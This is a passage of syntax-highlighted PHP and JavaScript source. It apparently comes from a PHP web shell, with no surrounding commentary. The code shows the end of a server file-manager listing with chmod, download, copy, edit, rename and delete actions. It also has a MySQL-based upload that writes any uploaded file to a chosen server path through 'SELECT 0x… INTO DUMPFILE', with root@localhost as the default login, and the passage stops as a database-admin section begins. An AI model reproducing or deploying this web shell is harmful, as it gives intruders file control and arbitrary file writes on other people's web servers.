#ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'size'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:fileperm(\\''<\/span>.$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>].<span style=\"color: #66cccc;\">'\\');\"&gt;'<\/span>.<span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'filechmod'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt; \/ '<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:fileperm(\\''<\/span>.$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>].<span style=\"color: #66cccc;\">'\\');\"&gt;'<\/span>.<span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'fileperm'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'fileowner'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:dofile(\\'downfile\\',\\''<\/span>.$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;Down&lt;\/a&gt; | '<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:copyfile(\\''<\/span>.$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>].<span style=\"color: #66cccc;\">'\\');\"&gt;Co<\/span><span style=\"color: #66cccc; text-decoration: underline;\">py&lt;\/a&gt; | '<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:opfile(\\'editfile\\',\\''<\/span>.$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\',\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'dirlink'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;Edit&lt;\/a&gt; | '<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:rename(\\''<\/span>.$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>].<span style=\"color: #66cccc;\">'\\');\"&gt;Rena<\/span><span style=\"color: #66cccc; text-decoration: underline;\">me&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/td&gt;&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">file_i<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"head\"&gt;&lt;td&gt;&amp;nbsp;&lt;\/td&gt;&lt;td&gt;Filename&lt;\/td&gt;&lt;td width=\"16%\"&gt;Last mod<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ified&lt;\/td&gt;&lt;td width=\"10%\"&gt;Size&lt;\/td&gt;&lt;td width=\"20%\"&gt;Chmod \/ Perms&lt;\/td&gt;&lt;td width=\"22%\"&gt;Action&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>).<span style=\"color: #66cccc;\">'\"&gt;&lt;td align=\"center\"&gt;&lt;input name=\"chkall\" value=\"on\" t<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ype=\"checkbox\" onclick=\"CheckAll(this.form)\" \/&gt;&lt;\/td&gt;&lt;td colspan=\"4\"&gt;&lt;a href=\"javascript:dofile(\\'delfiles\\');\"&gt;Delete selected&lt;\/a&gt;&lt;\/td&gt;&lt;td align=\"right\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dir_i<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' directories \/ '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">file_i<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' files&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/form&gt;&lt;\/table&gt;'<\/span>);\n}<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">end dir<\/span>\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'sqlfile'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">doing<\/span>==<span style=\"color: #66cccc;\">\"mysqlupload\"<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">file<\/span> = $<span style=\"color: #6699cc;\">_FILES<\/span>[<span style=\"color: #66cccc;\">'uploadfile'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filename<\/span> = $<span style=\"color: #ffcc66;\">file<\/span>[<span style=\"color: #66cccc;\">'tmp_name'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">savepath<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'The goal file has already existed'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!$<span style=\"color: #ffcc66;\">filename<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Please choose a file'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fp<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fopen(<\/span>$<span style=\"color: #ffcc66;\">filename<\/span>,<span style=\"color: #66cccc;\">'r'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">contents<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fread(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">filesize(<\/span>$<span style=\"color: #ffcc66;\">filename<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">contents<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">bin2hex(<\/span>$<span style=\"color: #ffcc66;\">contents<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!$<span style=\"color: #ffcc66;\">upname<\/span>) $<span style=\"color: #ffcc66;\">upname<\/span> = $<span style=\"color: #ffcc66;\">file<\/span>[<span style=\"color: #66cccc;\">'name'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>,$<span style=\"color: #ffcc66;\">dbuser<\/span>,$<span style=\"color: #ffcc66;\">dbpass<\/span>,$<span style=\"color: #ffcc66;\">dbname<\/span>,$<span style=\"color: #ffcc66;\">charset<\/span>,$<span style=\"color: #ffcc66; text-decoration: underline;\">dbport<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'$savepath';\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span>$<span style=\"color: #ffcc66;\">result<\/span> ? <span style=\"color: #66cccc;\">'Upload success'<\/span> : <span style=\"color: #66cccc;\">'Upload has failed: '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_error<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">(<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;script<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"text\/javascript\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">mysqlfile<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'doing'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'mysqlfile'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbhost<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'dbinfo'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbhost<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'mysqlfile'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbport<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'dbinfo'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbport<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'mysqlfile'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbuser<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'dbinfo'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbuser<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'mysqlfile'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbpass<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'dbinfo'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbpass<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'mysqlfile'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbname<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'dbinfo'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbname<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'mysqlfile'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">charset<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'dbinfo'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">charset<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'mysqlfile'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #6699cc;\">&lt;\/script&gt;<\/span>\n<span style=\"color: #cc99cc;\">&lt;?php<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">dbhost<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">dbhost<\/span> = <span style=\"color: #66cccc;\">'localhost'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">dbuser<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">dbuser<\/span> = <span style=\"color: #66cccc;\">'root'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">dbport<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">dbport<\/span> = <span style=\"color: #66cccc;\">'3306'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=<span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #66cccc;\">'MYSQL Information'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbinfo'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'sqlfile'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBHost:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbhost'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">20<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbhost<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">':'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbport'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">4<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbport<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBUser:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbuser'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">15<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbuser<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBPass:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbpass'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">15<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbpass<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBName:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbname'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">15<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbname<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBCharset:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeselect(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'charset'<\/span>,<span style=\"color: #66cccc;\">'option'<\/span>=&gt;$<span style=\"color: #ffcc66;\">charsetdb<\/span>,<span style=\"color: #66cccc;\">'selected'<\/span>=&gt;$<span style=\"color: #ffcc66;\">charset<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'nokey'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;form action=\"'<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>.<span style=\"color: #66cccc;\">'\" method=\"POST\" enctype=\"multipart\/form-data\" name<\/span><span style=\"color: #66cccc; text-decoration: underline;\">=\"mysqlfile\" id=\"mysqlfile\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;Upload file&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;\/b&gt;&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;Save path(fullpath): &lt;input class=\"input\" name=\"savepath\" size=\"45\" ty<\/span><span style=\"color: #66cccc; text-decoration: underline;\">pe=\"text\" \/&gt; Choose a file: &lt;input class=\"input\" name=\"uploadfile\" type=\"file\" \/&gt; &lt;a href=\"javascript:mysqlfile(\\'mysqlupload\\');\"&gt;Upload&lt;\/a&gt;&lt;\/p&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;Download file&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;File: &lt;input class=\"input\" name=\"mysqldlfile\" size=\"115\" type=\"text\" \/<\/span><span style=\"color: #66cccc; text-decoration: underline;\">&gt; &lt;a href=\"javascript:mysqlfile(\\'mysqldown\\');\"&gt;Download&lt;\/a&gt;&lt;\/p&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dbhost'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dbport'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dbuser'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dbpass'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dbname'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'charset'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'doing'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'sqlfile'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/form&gt;'<\/span>);\n}\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'mysqladmin'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   